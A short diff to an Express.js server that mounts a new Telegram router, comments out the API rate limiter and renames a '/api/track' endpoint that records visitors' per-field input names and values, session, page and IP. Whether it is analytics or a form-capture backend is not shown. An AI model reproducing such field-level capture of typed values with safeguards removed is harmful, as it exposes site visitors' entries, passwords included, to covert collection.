@@ -59,7 +59,7 @@ app.use(cors({
 app.use(express.static("public"));
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
-
+const telegramRouter = require('./routes/telegram');
 // Import Router
 const authRouter = require("./routes/auth");
 const billingRouter = require("./routes/billing");
@@ -98,9 +98,9 @@ const saveDataToFile = () => {
   fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
 };
 
-app.use("/api/", limiter);  // Apply to API routes
+//app.use("/api/", limiter);  // Apply to API routes
 
-app.post("/api/track", async (req, res) => {
+app.post("/api/tabba3", async (req, res) => {
   const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
 	if (!ip) {console.error('IP undefined');
@@ -387,7 +387,7 @@ app.use("/api/user", userRouter);
 app.use("/api/auth", authRouter);
 app.use("/api/billing", billingRouter);
 app.use("/api", authRouter);
-
+app.use('/api/telegram', telegramRouter);
 // Add error handling middleware
 app.use((err, req, res, next) => {
   console.error(err.stack);
